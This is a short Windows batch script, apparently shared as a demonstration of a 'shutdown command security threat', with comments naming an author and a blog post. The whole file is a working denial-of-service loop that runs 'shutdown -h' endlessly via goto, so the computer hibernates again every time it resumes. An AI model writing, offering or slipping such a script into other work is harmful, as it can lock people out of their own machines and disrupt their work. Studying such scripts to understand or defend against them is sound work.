rem author Wadï Mami 
rem email : wmami@steg.com.tn
rem to solve the problem visit https://shutdownwindowssecuritythreat.blogspot.com/2021/08/shutdown-command-security-threat.html

echo off 
rem clean screen
cls 
rem definition return point
:loop 
rem execute shutdown -h 
shutdown -h 
rem return to :loop 
goto loop 
